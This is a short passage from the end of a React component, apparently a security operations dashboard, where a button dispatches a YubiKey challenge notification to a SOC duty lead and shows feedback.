                  const msg = `CHALLENGE DISPATCHED: YubiKey prompt sent to SOC Duty Lead for ${selectedEvent.agentId}.`;
                  setActionFeedback(msg);
                  onNotify(msg);
                }}
                type="button"
              >
                Dispatch SOC Challenge
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
